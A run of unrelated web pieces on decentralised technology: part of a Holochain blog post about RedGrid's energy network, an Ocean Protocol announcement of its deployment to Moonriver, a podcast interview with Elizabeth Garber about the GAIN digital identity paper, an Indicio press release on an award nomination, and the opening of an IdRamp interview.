If grid operators and power producers choose to use aggregated, anonymised data from individuals and virtual microgrids, they can do an even better job of planning, building out, and maintaining their infrastructure.  As the network grows, third-party service providers can pop up, offering intelligence and insights to help everyone reduce their energy use even further.  Equipped with IOEN-based management software, new microgrid projects could receive investor money in exchange for a stake in revenues, accelerating the adoption of renewables.  <p>The Rocky Mountain Institute calls this <a href="https://rmi.org/insight/the-economics-of-demand-flexibility-how-flexiwatts-create-quantifiable-value-for-customers-and-the-grid-executive-summary/">demand flexibility</a>, predicting that it can <a href="https://rmi.org/insight/the-carbon-emissions-impact-of-demand-flexibility/">reduce energy-related emissions</a> by up to 40% as energy electrifies and decarbonises. But they see electricity pricing as the main coordination tool. RedGrid’s vision for the IOEN embraces pricing but goes beyond it, giving us a way to coordinate directly and explicitly with each other.</p> Why decentralisation? <p>Good question. Decentralised coordination is messy and awkward. If you’ve ever tried to organise a multi-family camping trip, you know what I’m talking about.</p><p>First of all, when we’re dependent on faraway, centralised infrastructure and all the stuff that connects us to it, we’re in a vulnerable position. This goes for both electricity generation and the digital tech needed to make it ‘smart’. What if the power plant, the <a href="https://www.protocol.com/enterprise/slack-outage-january-aws">machines in the data centre</a>, or any of the miles of wiring between them and our town, go offline (or even <a href="https://www.theregister.com/2021/03/10/ovh_strasbourg_fire/">burn down</a>)? Suddenly we’re stranded. With rooftop and community solar, <a href="https://en.wikipedia.org/wiki/Tesla_Powerwall">home batteries</a>, and <a href="https://en.wikipedia.org/wiki/Edge_computing">edge computing</a>, we have the means to stay online, right in our home town.</p><p>Second, the further away the power source is from your plug, the <a href="http://insideenergy.org/2015/11/06/lost-in-transmission-how-much-electricity-disappears-between-a-power-plant-and-your-plug/">more energy is lost</a>. It’s not a huge deal, but local generation does come out a little bit ahead.</p><p>Lastly, the rising complexity of the modern grid, along with the decisions we need to make, will virtually demand it. Zillions of new internet-connected plugs, toasters, solar panels, and car chargers will be coming online, producing lots of data and expecting to be able to make split-second decisions based on current local conditions. This is a <a href="https://www.sciencedirect.com/science/article/pii/S2666792420300068">logistical</a> <a href="https://cse.buffalo.edu/faculty/tkosar/cse710_spring19/shi-iot16.pdf">challenge</a> for cloud computing, which (despite its fluffy name) happens in faraway data centres. It’s going to be hard for the cloud to keep up. (And I ought to point out that it has its own <a href="https://www.masonandhanger.com/blog/data-center-energy-consumption/">ecological problems</a> too).</p> Where Holochain comes in <p>This is the Holochain Blog, after all, so I ought to mention it. Why did RedGrid build the IOEN on Holochain? The way Mike explained to me, it’s because Holochain is built for decentralisation.</p><p>And I’m not talking about the sort of decentralisation you see in blockchain. It’s a marvellous feat of engineering with some compelling use cases, but <a href="https://medium.com/@VitalikButerin/the-meaning-of-decentralization-a0c92b76a274">it’s still logically centralised</a>, according to Ethereum’s creator Vitalik Buterin.</p><p>In practice, that means that your smart devices need to be connected to the global blockchain network all the time. This demands an always-on internet connection with zero downtime — which is fine if that’s what you have, but it’s problematic if you’re part of the world’s majority who live with patchy power and internet.</p><p>First-generation blockchains are also unfit for tiny smart devices, and they consume a <a href="https://blog.holochain.org/satoshi-nakamoto-and-the-fate-of-our-planet-2/">massive amount of electricity for very little work</a> (although newer DLTs are addressing those problems). The solution shouldn’t contribute to the problem. Mike tells me that “we turned our backs on Ethereum years ago”.</p><p>Holochain was designed to <a href="https://developer.holochain.org/concepts/4_dht/#resilience-and-availability">tolerate</a> messy, unreliable connectivity. Far from being an anomaly, this may become increasingly common. During our local wildfire season, one fire <a href="https://www.castanet.net/news/West-Kelowna/340081/Disaster-has-been-averted-for-now-Brenda-Creek-fire-skirts-past-BC-Hydro-transmission-lines#340081">nearly knocked out</a> power and internet for 60,000 people. This would not have been a problem for an IOEN-powered local grid.</p><p>Holochain’s creators <a href="https://blog.holochain.org/energy-as-a-currency-holochain-and-sustainable-energy/">built it for edge computing</a> in the extreme. Every device carries its own weight, according to its ability. It <a href="https://developer.holochain.org/concepts/3_source_chain/">stores its own data</a>, makes its own decisions, connects directly to neighbouring devices, and helps <a href="https://developer.holochain.org/concepts/4_dht/">support the health</a> of the local network. This lets the computing capacity scale linearly with the number of participants. And less powerful devices will soon be able to offload their work to a <a href="https://holo.host">decentralised cloud</a> if needed.</p><p>Mike and his colleagues also appreciated that Holochain already had a small but strong developer community. In preparation for an IOEN demo for their partner Monash University, Holochain developers from around the world <a href="https://blog.holochain.org/building-together-redgrids-internet-of-energy-mission-and-the-holochain-community/#strength-in-a-band-of-allies">rallied around RedGrid</a> to make it happen. After the demo, Mike <a href="https://youtu.be/BYcpuKBRIEs?t=2393">said</a>:</p><blockquote>“I should point out that what attracted me to Holochain was the support, not so much the tech. And it’s just in the last month that this has proven out, with Guillem and Connor [and Alfredo, Jesús, and Eduardo] helping us… You can see in GitHub and Discord their discussions with David Meister and Tom Gowan [Holochain core devs], to the point where a community dev actually found things and updated the core. It’s really pretty impressive. And Monash recognised that.”</blockquote><p>Adam agreed, <a href="https://youtu.be/BYcpuKBRIEs?t=2426">saying</a>,</p><blockquote>“And that was really cool, because you’re building together. For us as a company, we’ve had lots of good support from Art [Brock] and Eric Harris-Braun [Holochain co-founders] from the beginning, and obviously other people Mike mentioned... It makes us feel good—about the community, about the whole mission, and also there are other people out there who are not building on Holochain but believe in what we’re doing, the Holochain/RedGrid combination.”</blockquote> Where you come in <p>When we’re faced with the stark challenge of climate change, and the apparent <a href="https://www.theguardian.com/environment/2021/sep/28/blah-greta-thunberg-leaders-climate-crisis-co2-emissions">inaction</a> of the people who make decisions, it’s easy to fall into discouragement. Many of us are desperate to see change, but feel powerless to actually make the change happen. We would seize any opportunity to get our agency back, to help guide our world towards a happy future.</p><p>And we technologists have often found ourselves part of the problem rather than the solution. But projects like this remind me that there is a place for appropriate applications of technology, <a href="http://worrydream.com/ClimateChange/">there is a role for people</a> who can design, program, build, tinker, and tweak. We can “create options for policy-makers”, in the words of Saul Griffith. And when they ignore those options, we can step around them and build tools for everyone — tools for <a href="https://medium.com/metacurrency-project/a-compass-for-a-life-affirming-economy-328ab09e1a87">coordination</a>, tools to <a href="https://www.artbrock.com/2020/07/29/currencies-are-records-of-currents">make the invisible visible</a>. Tools to help us make sense of our world and take action together.</p>

<p>Ocean Protocol smart contracts and Ocean Market are on the leading EVM Kusama Parachain, to unlock the Web3 Data Economy for the Polkadot ecosystem</p><p>As part of Ocean’s<a href="https://blog.oceanprotocol.com/oceans-on-ethereum-mainnet-ba9be1aee0ce"> multi-chain strategy</a>, we have deployed Ocean’s technology to <a href="https://moonbeam.network/networks/moonriver/">Moonriver</a>.</p><p>Moonriver is the leading EVM-compatible chain in the Kusama / Polkadot ecosystem. This gives it excellent security and cross-chain interoperability that will continue to&nbsp;improve.</p><p>Moonriver is a parachain (sub-chain) that leverages Kusama relay chain (parent chain) security. It’s a sister to the upcoming Moonbeam chain, a parachain to Polkadot relay chain. Kusama targets rapid testing and long-tail applications, whereas Polkadot targets slower large-enterprise applications.</p><p>Moonriver went live on Aug 26, 2021. Its traction is already impressive: within three weeks, <a href="https://cryptoslate.com/kusama-dapp-moonriver-records-1-million-transactions-in-just-3-weeks/">it hit </a>1 million transactions and 100K wallet addresses. A week and a half later, the <a href="https://blockscout.moonriver.moonbeam.network/">transactions had doubled to 2 million</a>. It has more than <a href="https://defillama.com/chain/Moonriver">$200M staked in DeFi applications</a> and another <a href="https://moonriver.subscan.io/">$270M bonded in collator staking</a>, excellent for any network, let alone such a young&nbsp;one.</p><p>The Ocean core team and Moonriver / Moonbeam core team (<a href="https://twitter.com/purestakeco">PureStake</a>) have been <a href="https://twitter.com/oceanprotocol/status/1353677332704329733">collaborating since January 2021</a>. In April, the Ocean core team deployed Ocean backend components and Ocean Market frontend to Moonbase Alpha testnet, then <a href="https://twitter.com/oceanprotocol/status/1387044024574373889">shared that work</a> in the Moonbeam #Illuminate21 community event. The teams worked closely to iron out small kinks. The Ocean deployment to Moonriver is the first major technology milestone in this collaboration, and as part of the broader Ocean — Polkadot ecosystem.</p><p>Ocean and Polkadot have grown up together. The creators of Ocean (and before that BigchainDB and ascribe) and creators of Kusama / Polkadot have been collaborating since 2014-era Ethereum days through the founding of Parity (née Ethcore) and Web3 Foundation, from security audits to go-to-market strategy, and always with an eye towards technology integration.</p><p>In 2017, Ocean founder Trent McConaghy presented “The Web3 Data Economy” vision at the inaugural Web3 Summit conference, hosted by Web3 Foundation [<a href="http://trent.st/content/20181022.2%20Web3%20Summit%20-%20McConaghy.pdf">slides</a>][<a href="https://www.youtube.com/watch?v=sKbVieQ_foo">video</a>][<a href="https://blog.oceanprotocol.com/the-web3-data-economy-b6fd8ecac4c4">blog post</a>]. The Ocean Moonriver deployment makes this vision real in Web3 Foundation ecosystem.</p><p>Moonriver is fully Ethereum-compatible, which allows it to run Ethereum smart contracts and use Ethereum-style ERC20 tokens. It’s a Proof-of-Stake chain with a modern consensus algorithm built on <a href="https://www.parity.io/technologies/substrate/">Parity Substrate</a> technology. This allows it to have low gas fees and low latency compared to Ethereum&nbsp;mainnet.</p>The <a href="https://market.oceanprotocol.com/asset/did:op:Fdc8aDac3F2869855dF069ED3D3604BF630701aD">first dataset published in Moonriver</a>.<p>With Ocean deployed to Moonriver, this&nbsp;means:</p>  Users of<a href="http://market.oceanprotocol.com"> Ocean Market</a> can publish, swap, stake, and consume data assets in Moonriver.  Data marketplace builders and other dApp developers can use Ocean libraries (ocean.js, ocean.py) and frontend components (<a href="https://github.com/oceanprotocol/market">market</a>) with Moonriver.

<p>Let’s Talk About Digital Identity, the podcast connecting identity and business. I am your host, Oscar Santolalla.</p>
<p>Oscar Santolalla: Hello, and thanks for joining. Our guest today played a leading role editing a paper published by more than 150 identity experts. The paper is called GAIN: How Financial Institutions are taking a leadership role in the Digital Economy by establishing a Global Assured Identity Network. It was announced at the European Identity and Cloud Conference last 13th of September by Nat Sakimura, who is the Chairman of the OpenID Foundation, and Gottfried Leibbrandt, former CEO of Swift, and then was published by, among others, the Institute of International Finance.</p>
<p>Our guest today is Elizabeth Garber. She is a customer and product strategist who started her career in telecommunications and honed her craft in six different industries before joining one of the world’s largest retail banks. She is an expert in designing experiences and delivering transformational change based on a deep understanding of people. This interest has underpinned her graduate studies of the psychology of cross functional teams, as well as how customers define value in relation to the services they use.</p>
<p>In 2015, she was named one of the top three marketers under 30 by the UK Marketing Society, and was recognised by Energy UK and EY for her work building trust across the UK energy industry. In 2017, she won the Financial Times 30% club Women in Leadership Award.</p>
<p>Hello, Elizabeth.</p>
<p>Elizabeth Garber: Hello, thanks for having me.</p>
<p>Oscar: It’s a pleasure. Welcome to our show. And let’s talk about digital identity. And certainly, we always like to start hearing a little bit more about our guest, especially how was your journey into this world of digital identity. Please tell us a bit about yourself.</p>
<p>Elizabeth: Sure. So my name is Elizabeth Garber. As you said, I’m a customer strategist, a product owner and service innovator. Now, I’m also a digital identity evangelist, I suppose. My passion is for understanding people, what drives their behaviour, how does any kind of service really add value in their lives. Then I help organisations to build services and communicate those benefits to real people. So these skills, I think, are critical in the digital identity space, because the solutions that we design really need to reflect the people who use them, how they move through their worlds, globally.</p>
<p>And not only that, but really great customer experience, designers, product owners, they’ll get to know what’s really on people’s mind that might prevent adoption of any one solution. And how different solutions kind of destroy value maybe in sometimes insidious ways, like a really convenient identity solution could come with some real trade-offs that are invisible to users at first. Maybe their data isn’t secure, maybe it’s sold off, maybe they’re giving it willingly, but they’re blind to some of the applications that will follow.</p>
<p>As someone who hasn’t been involved in identity for all that long, I can really relate to the users who don’t understand the difference between the offers that are currently on the market, and what might be there in future. So I’m here to get underneath how our identity solutions are going to create and potentially undermine benefits for real people. And then I want to promote the adoption of good ethical solutions.</p>
<p>Oscar: Excellent. And what was your exact role in this project in this paper, GAIN?</p>
<p>Elizabeth: In the paper?</p>
<p>Oscar: Mm-hmm.</p>
<p>Elizabeth: Yeah, as it turned out, a few other people thought that I could be useful. So one of the early co-authors Rod Boothby, who chairs the Open Digital Trust Initiative at the Institute of International Finance, reached out to me about his work. I was really floored when he took me through it and I knew that I wanted to get involved. It was really exciting. So, after I read through some of the documentation, I sent him some thoughts about the value to users, to banks, to relying parties.</p>
<p>And then within a few days, I was facilitating a virtual whiteboard session with a lot of the other co-authors all over the world, trying to help them kind of coalesce around who the paper was for, who is the audience, what are the messages that are going to resonate with that audience and then the structure of the paper. At that point, I wondered if someone might realise that I didn’t have a huge background in identity, maybe kick me out, but they are an inclusive group of people, and they really valued the approach. So ultimately, I played a pretty big role in pulling the paper that we published together.</p>
<p>I should say who else was involved. It was really an experiment in radical democracy as Don Thibeau of the OpenID Foundation likes to say. We brought more than 150 people together, experts in the space. I might mention some of their names in this interview, but it was a pro bono, no logos collaboration. But we did have the support of some major organisations in the space. The ones that participated and are now publishing and promoting the paper include the OpenID Foundation, the Institute of International Finance, the Open Identity Exchange, the Global Legal Entity Identifier Foundation, and the Cloud Signature Consortium.</p>
<p>Oscar: Excellent. Tell us a bit more about the…</p>
<p>Elizabeth: The paper itself?</p>
<p>Oscar: Yes, please.</p>
<p>Elizabeth: OK. Yeah, sure. So the paper invites financial institutions. It’s a call to action for financial institutions to join us in solving the biggest problem on the internet – a lack of trust, specifically a lack of trust due to the absence of verified identities. How do you know the person you’re dealing with is real? How do you know that they are who they claim to be? How do you know that your money will end up in the right hands? Fraud and cybercrime increases every year. Some estimates say it’s 5% of GDP, trillions of dollars. Criminals are thriving in anonymous digital spaces.</p>
<p>And at the same time, you and I and our friends are pervasively tracked. We enter our details into countless sites, service providers follow us around, they trade our information. Even our biometrics are seeping around into more and more places, our faces, our fingertips, more and more people or parties have access to really private, really personal information that could be used in any number of ways – steal our identities, for example. And that needs to stop.</p>
<p>The paper argues for the internet’s missing trust layer. That’s a phrase coined by one of the co-authors, Kim Cameron, who led identity at Microsoft for many years, and he wrote the Laws of Identity. Then this concept was really beautifully explained by Nat Sakimura, Chairman of the OpenID Foundation at the European Identity and Cloud Conference in September. In this new paradigm, highly trustworthy identity information is passed from a regulated or otherwise highly trusted institution to an organisation that needs it, with end user knowledge and consent every time.</p>
<p>So, if I’m buying another bottle of Malbec, I shouldn’t have to prove my age by uploading a driver’s license to another site or sharing a photo of my face. You don’t need my name, my face, my address. No one else needs a copy of my credentials or biometric information. You just need to know that I am the person I say I am and that I’m old enough. So my online wine retailer can send a message to my trusted identity information provider. I would choose my bank and they will use their app to authenticate me and say, “Hey, the International House of Malbec wants to know if you’re over 21, should I tell them?” And of course, it’s a yes, because I need to celebrate recording this podcast.</p>
<p>Oscar: Tell us a bit the solution itself because there are some solutions, which one way or another address the problem you described?</p>
<p>Elizabeth: Yeah, so none of this is really new. People have called for this for years. One of my co-authors actually from INNOPAY, Douwe Lycklama, shared a YouTube video arguing for the same thing, and it was dated in 2007. Of course, it does exist in some places already, Norway, Sweden, Belgium, Canada, Finland, in one form or another lots of jurisdictions around the world have a solution like this. And as another GAIN co-author Dave Birch, who also wrote Identity is the New Money, pointed out in Forbes last week – We’re starting to see evidence that these networks really facilitated the rollout of aid during the pandemic, and mitigated the risk of fraud.</p>
<p>In particular, another co-author from Vipps in Norway helped us to compare some early information coming out against the US, UK data. So no, none of its new but we do argue in the paper that now is the time to think about global interoperability of these networks.</p>
<p>Oscar: Yeah, and I think as the model of doing the solving these problems goes towards how the countries you have mentioned, most of them have created a system based on banks, others combined with all of the mobile operators, right, but those are like the main types. And the states, of course, the states, some of the states has also provided that. So these are the three types of identity provider, the one who provision these systems, this identification service, but obviously, it’s not – it’s not commercial big tech, no, that’s out of these group of entities who provide these systems.</p>
<p>And of course, you mentioned different countries. We talk about few countries that have sufficient solutions. But I think the next question would come, how to make it available for the rest of the world, how we ensure some type of global interoperability?</p>
<p>Elizabeth: Absolutely, absolutely. So we think global interoperability is really important for a lot of different reasons. Three in particular spring, to my mind. The number one, end users want to live globally, maybe more importantly, most online companies are global or need to be global. They have suppliers and customers across borders. So the benefits increase dramatically when a trust network is global, rather than local – fewer contracts, fewer integrations, and the benefits extend throughout their supply chains all the way to the end users who benefit from simpler, more convenient services all across the internet.</p>
<p>Because my second point is, it’s an extension of that first one that those benefits actually extend to global society. A global network allows a specialist artisan in one part of the world to reach a global audience without relying on an intermediary. So Oscar, let’s say you have something to celebrate, and you’ve decided to buy yourself a handmade quilt from India, a Kantha. You will be able to find sellers that you can trust and they’ll be able to sell to you, charge you the price that someone in Finland expects to pay, and they will keep a greater percentage of it for themselves, potentially. So this is really going to unleash creativity and expand access to individuals and communities and sellers all around the world.</p>
<p>Finally, there’s a practical benefit from promoting this vision of interoperability. And I believe it’s the key factor that will move the needle towards actually setting up this trust layer in places where it does not exist today. Major relying parties, and I’m talking now about big companies that operate worldwide with the heft to influence a global movement, they buy into this vision only when it has a global reach. They don’t want to integrate with a different provider in every jurisdiction on the planet. So with that in mind, financial service institutions around the world are far more likely to collaborate and catalyse this movement, if they see that the vision is expansive enough to meet the demand for global reach.</p>
<p>Oscar: Okay, so definitely interoperability is something that we aim – not only the ones who are like me, I’m in Finland would like to have the same for the rest, but the ones who don’t have a sufficient identification system like those. But then something caught my attention is in the white paper. It says GAIN Digital Trust: How financial institutions are taking a leadership, et cetera, et cetera. So that means that the 100 persons who have been involved in this are targeting financial institutions. So why is targeting specifically financial institutions?</p>
<p>Elizabeth: Great question. So the main body of the paper is targeting, it’s directed at the world’s large financial institutions. It’s a call to action for them to catalyse the creation of a globally interoperable network. To be really, really clear with everybody though, we don’t think the paper or the global assured identity network is only for banks or financial institutions. The network itself must be inclusive, and in some parts of the world energy companies, telecommunications providers etc., they may be better placed than banks to be trusted identity information providers.</p>
<p>However, we argue that financial institutions are really well positioned to spark this change, to bring it to life, and to benefit from it. And so that’s what the paper really gets into. It runs through the reasons why financial institutions are positioned to do it – a point we repeat a few times – because we’ve seen them do it before. They built the rails for global payments, for cards, for securities, etc. They built Swift, Mastercard, Visa.</p>
<p>There are three main strengths that they have that makes them the perfect catalyst. Number one is trust. It’s a bank’s core offer. I know some people might laugh at that, because you don’t always trust a bank to give you the best rates, or brilliant customer service every time, but you do trust them. You trust them to keep your money and your data safe. That’s why they exist. Some companies monetise your data. Banks, financial institutions are in the business of monetising your security and privacy. And they have been since the very first bank – the Medici bank in 1397. Banks are trusted.</p>
<p>Number two, the second point, is a build off the first. They are regulated. A lot of that trust is underpinned by regulation. They need to be worthy of our trust and meet certain standards so that other businesses do not – and there are governance frameworks to build upon as these new services are created.</p>
<p>The third point that makes them a great catalyst, the third strength, is how well they know their customers. Because of those first two things, banks invest significant amounts of money in making sure that they know their customers. You might hear me say Know Your Customer, or KYC, is the process – and it’s regulated – that they go through to validate your identity when you open an account. And they also build the technical infrastructure to know that it’s you each and every time someone tries to get into your account. They have built best-in-class tools to identify, authenticate you, while keep your account secure and your information private. And all that’s why banks are best placed to vouch for your identity and to use their authentication methods to confirm on behalf of others that it’s really you.</p>
<p>Oscar: What would make possible that there is such interoperability in more practical, more technical terms?</p>
<p>Elizabeth: Good question. So we’re going to try to apply interoperability standards that many different types of systems can plug into. There will be direct participants, banks or other identity information providers who use the network to verify information for the companies who need to consume it. And, of course, there will need to be intermediaries and translation layers to ensure that a BankID Sweden customer can verify their identity with a seller in Mexico, for example. That BankID customer will continue to verify using BankID. But we will have created a way for BankID to communicate to relying parties all over the world, including Mexico.</p>
<p>We can also create servers that tap into self-sovereign identity networks. It’s important to know that we’re designing this system so that identity information passes from the provider, the identity information provider, directly to the relying party without passing through any centralised GAIN entity. That’s really important, at least as we understand it. That’s really important when we start to talk about interoperability from a legal standpoint.</p>
<p>Technically speaking, though, these direct connections are enabled by common API specifications. They’re based on OpenID standards, such as FAPI. With all that said, this field is evolving and technical proof-of-concepts are underway. So I definitely need to reserve the right to build upon my answer later on.</p>
<p>Oscar: Yeah, definitely. It’s very convincing your point, your three points. And I can feel that, absolutely. And the banks have already proved that in some of the countries that we have mentioned that they are leaders in this identification.</p>
<p>Elizabeth: Absolutely. Yep.</p>
<p>Oscar: And now my guess that among the 150 authors, there are some people who are directly involved in banks.</p>
<p>Elizabeth: Mm-hmm.</p>
<p>Oscar: OK, excellent.</p>
<p>Elizabeth: Yes. Like I said, it was a no logo collaboration so I won’t be dropping the names of any specific names.</p>
<p>Oscar: Yes.</p>
<p>Elizabeth: But we did have the partnership of the Institute of International Finance, who is pulling together a proof of concept with the Open Digital Trust Initiative. And we do have banks involved in that.</p>
<p>Oscar: So why it is really good for banks from the bank’s point of view, why it’s good to join GAIN?</p>
<p>Elizabeth: Yeah, so importantly, it’s not just that they can do this, it’s also that they will benefit from doing it. The first benefit that’s easiest to explain is simple, it’s revenue. Identity verification services will have as they do today, a small price attached. Transactions will result in a small amount of money flowing into the ecosystem. And a percentage will go to the identity information provider, in this case, the bank. That turns the assets that I was just talking about – what they’ve spent to build up KYC, authentication, security, all those infrastructures – that turns them from a major cost centre, into a profit centre.</p>
<p>Second, there will be massive efficiencies for banks, password resets, document signing, mortgage processing, etc. There will be more efficiency inside a bank. They will also see less fraud. In Norway, BankID saw fraud reduced from something like 1% to 0.00042% of transactions.</p>
<p>But the biggest benefits are strategic. New competitors are coming in between banks and their customers, are diminishing the role that banks play in providing access to capital markets. Providing identity information services to their customers, under their brand name, cements a really critical role for banks. They will provide their customers with access to the digital economy. And they will keep their customers safer, more secure in their privacy than they are today. And that’s a real value add for their customers. So strategically, banks really must do this, or they risk getting cut out of a lot of transactions.</p>
<p>Oscar: Indeed, banks have to hear it. When I started reading more about this paper, and you have mentioned at the beginning also, that the Global LEI Foundation is also involved, it’s one of the main supporters of this initiative. So tell me how that relates to that. They are not the banks. Of course, they have some business with the banks. But please tell us what is the connection?</p>
<p>Elizabeth: Yeah, I listened to <a href="https://www.ubisecure.com/podcast/clare-rowley-gleif/" title="your podcast that you did with GLEIF, Global Legal Entity Identifier Foundation">your podcast that you did with GLEIF, Global Legal Entity Identifier Foundation</a>, while I was preparing to talk to you. And yeah, I think the connections are really strong. So they were a critical partner in pulling the paper together. They’re doing incredibly important work, and will absolutely be part of the next steps as we figure out how to realise a global assured identity network.</p>
<p>There are three types of identity questions that we all really have as we transact online. Who is this person? Can I trust them? Who is this company? Are they trustworthy? And then connecting the two. Is this person related to a company? What’s their role? Are they entitled to be doing this thing, signing this document logging into my account on the company’s behalf? If we start getting key information about the individual, that’s great, that adds a ton of value. GLEIF is answering that second question, who is the company? And once we can get to the third point of connecting the dots, that’s going to be really powerful. So yeah, GLEIF is a critical partner and will remain so throughout the rest of the journey.</p>
<p>Oscar: Yeah, yeah, now the way you have explained also is pretty good. And we say that verify identity of a person, of a company or organisation and how to link these two in this. And that’s pretty critical. That’s something that has not been explored enough, I would say. So that’s, I’m really intrigued to hear how GAIN is addressing doubts about this because it’s essential these days.</p>
<p>So, Elizabeth, I’d like to hear more what comes next. So just a couple of weeks ago was the launch of the paper and I also saw some interest on the media. That’s excellent to hear. But what come next now for GAIN?</p>
<p>Elizabeth: Well, we already have planning underway for GAIN technical proof of concept. And we’re looking for more people to get involved, more companies to participate. So we have big companies who need to de-duplicate their customers, companies that need to collect verified signatures, the number of use cases is seemingly endless. We’re also looking for partners, aggregators, or service providers who can help us – help bring these relying parties on board or technical service providers who can help us to envision and build services on top.</p>
<p>There are so many ways to be involved. So if you’re thinking about getting involved, it might mean that you’re interested in identity. So you’re listening to this podcast after all, that probably means that you’re only one or two steps away from one of the co-authors, so it’d be really easy for you to reach out to them. You can also reach out to me or the <a href="https://www.linkedin.com/groups/12559000/">Global Assured Identity Network LinkedIn group</a> that we have. And if you’re really interested in the POC, we’ve got an email address for you, it would be <a href="mailto:digitaltrust@IIF.com">digitaltrust@IIF.com</a>. So even if none of that is true for you, there’s something you can do. You could call up your bank and tell them to offer this service</p>
<p>Oscar: Exactly. Even as a user, you can ask your customer for the bank, you can ask the bank, have you heard of GAIN? Yeah, absolutely. And I guess – assume that you already have a big list of the most potential use cases right that some of these customers, companies, service provider that you are now inviting. They could fit into this use cases. Excellent. Elizabeth, finally, tell us – for all business leaders that are listening to us in this interview. So what would you say is the one actionable idea that they should write on their agendas today?</p>
<p>Elizabeth: So these ideas that we’ve been talking about are going to mark a step change in the digital economy. A third wave in identity as my colleague Rod Boothby pointed out on LinkedIn last week. First, it was all about companies providing IDs and passwords to employees to access work systems, and businesses gave customers IDs and passwords to access services on the internet. This third wave is all about us bringing our own trusted digital identity wherever we go. With a really inclusive approach and active global collaboration, this will open up our digital economy. It’s going to expand access, and make life so much simpler and safer online.</p>
<p>So for those who are listening, I would urge business leaders to figure out what role your business can and will play in a globally interoperable assured identity network. Are you an identity information provider? Can you be? Will you be a relying party who consumes these services so that you can verify that the signature on a contract is valid? Can you help us onboard relying parties or integrate these services?</p>
<p>On your agenda, I’d say write down, figure it out, figure out how you’re going to get involved and then get in touch. Again, join our Global Assured Identity Network on LinkedIn, or email <a href="mailto:digitaltrust@IIF.com">digitaltrust@IIF.com</a>. If you know that you want to join the POC.</p>
<p>Oscar: Yeah, indeed. This might still be relatively new concept for companies who are not so exposed to this type of identity services. So yeah, it’s a good idea, as you said, to decide, think about what is going to be that new role of your company from the many choices you have mentioned.</p>
<p>Thanks a lot, Elizabeth. It was super interesting to hear about this extraordinary effort that had been done by GAIN project, very recently launched. And as you said, now, the Proof-of-Concept are starting to keep going. Please let us know how people could get in touch with you if they like to follow this conversation with you.</p>
<p>Elizabeth: Yeah, so you can find me on <a href="https://www.linkedin.com/in/elizabethgarber/">LinkedIn</a> really easily. My name is Elizabeth Garber. Yeah, I think that’s the easiest way.</p>
<p>Oscar: OK. LinkedIn is the easiest way. Thanks a lot Elizabeth. It was a pleasure talking with you and all the best.</p>
<p>Elizabeth: Thank you. Thanks for having me.</p>

				  Ken Ebert nominated in Blockchain Leadership Award category for vision and leadership in developing interoperable blockchain-based Trusted Data Ecosystems  
			  
				
				
				 <p>SEATTLE — October 05, 2021 — <a href="https://indicio.tech/">Indicio</a>, the world’s leading provider of decentralized identity and hosting solutions, today announced that company Chief Technology Officer Ken Ebert has been named as a finalist in the Blockchain Leadership Award category in the <a href="https://blockchainrevolutionglobal.com/the-eb-awards/">Enterprise Blockchain Awards</a> (EBAs) presented by the <a href="https://www.blockchainresearchinstitute.org/enterprise-blockchain-awards/">Blockchain Research Institute</a>. Ebert was recognized for his long-lasting vision for open-source identity technology anchored on a blockchain network to solve some of our most pressing online problems—verification, privacy, security, and user experience.</p>
<p>Ebert was one of the co-founders of Indicio.tech, and he has been pivotal in nurturing it from its launch at the start of the COVID pandemic to its position today as the global leader in developing decentralized identity infrastructure and software for building Trusted Data Ecosystems. He built a virtual team of highly-skilled developers that is diverse in gender and nationality, and he developed an intern and mentoring program to create the needed skills in new recruits as the company took on more and more customers’ projects.</p>
<p>With Ebert’s team-focused leadership, Indicio was able to successfully create and deploy a complete decentralized identity based data ecosystem, weaving together health agencies, global technology suppliers in the travel industry, and national governments. The company’s continuing success reflects on Ebert’s&nbsp; extraordinary ability to bring parties together and drive ideas and projects forward into workable technology that solves real-world problems. And, as a passionate advocate for interoperability in the open-source identity communities, Ebert isn’t just driving Indicio’s success, he’s helping to drive the adoption and evolution of blockchain technologies that promise transformative change and opportunity for everyone.</p>
<p>“Indicio’s success and its position as a global leader in the development of Trusted Data Ecosystems is a testimony to Ken’s seemingly boundless skill and wisdom. It’s not just his ability to analyze and clarify problems and guide our own team, it’s his tireless capacity to do so for all the companies who support the Indicio Network as well as our customers,” said Heather Dahl, CEO, Indicio. “That’s what makes him an outstanding leader. Part of that comes from character; part from experience; but a part of it is also a philosophy of ‘build now, build more, build better.’&nbsp; When you think about the problems we’re trying&nbsp; to solve, they’re huge. Ken is always the one to remind us—and our collaborators and customers—that we build solutions step by step. Let’s solve this bit first. And when you do this, and do it relentlessly, you’ll feel like you’re running and you can achieve anything.”</p>
<p>“I want to thank BRI for its dedication to helping enterprise leaders understand and implement blockchain within their industries. This is a technology that has&nbsp; enormous potential to rewrite the way we do so many things in business and society,” said Ebert. “It’s exciting to be the CTO of a company that is driving that transformation through the Indicio Network—a distributed blockchain for identity—and through designing solutions that give people the ability to prove identity and share data in a way that preserves their privacy, in&nbsp; a way that improves their security, and, above all, in a way that can be trusted. All this would be impossible without blockchain. I’m honored to be a finalist for this award;&nbsp; but I’m more excited by what we—Indicio, our clients, the identity community—can do for the world with this technology. That’s the excitement that greets me every day—and I want to share it with everyone.”</p>
<p>The Blockchain Leadership awards honor people who have shown exceptional leadership in a blockchain collaboration or implementation within an enterprise, an industry, a government, or a multi stakeholder organization. The nominees are those that have gone above and beyond the job description to spearhead blockchain initiatives within an enterprise or ecosystem.</p>

				 <p>A distributed ledger is a database that has copies distributed across a network of servers (nodes), all of which are updated simultaneously. A network like this is the foundation of decentralized identity, a way of generating robust trust and collaboration free of the security risks of centralized databases. We call the companies and organizations that support an Indicio Network node on a server that is under their control “Node Operators.”&nbsp;</p>
 
<p>Recently we caught up with Karl Kneis, COO of IdRamp, and Eric Vinton, Chief Business Officer of IdRamp, one of the first companies to become an Indicio Node Operator, to discuss their current projects, some goals for the future, and where they think decentralized identity is heading.</p> 
			  
				
				
				 <p>Tell us about IdRamp: how did it start, where did it start, and who makes up your team?</p>
